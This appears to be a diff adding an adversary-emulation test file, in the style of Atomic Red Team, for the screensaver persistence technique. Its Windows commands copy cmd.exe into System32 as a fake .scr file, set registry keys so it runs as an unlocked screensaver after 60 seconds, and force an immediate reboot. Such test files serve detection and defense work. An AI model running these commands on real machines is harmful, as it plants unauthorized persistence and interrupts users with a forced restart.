@@ -1,0 +1,13 @@
+#TechniqueName: Event Triggered Execution: Screensaver
+#AtomicTestName: Set Arbitrary Binary as Screensaver
+#Description: This test copies a binary into the Windows System32 folder and sets it as the screensaver so it will execute for persistence. Requires a reboot and logon.&
+#Language: cmd
+
+#commands
+copy C:\Windows\System32\cmd.exe "%SystemRoot%\System32\evilscreensaver.scr"
+reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 1 /f
+reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveTimeout /t REG_SZ /d 60 /f
+reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f
+reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "%SystemRoot%\System32\evilscreensaver.scr" /f
+shutdown /r /t 0
+
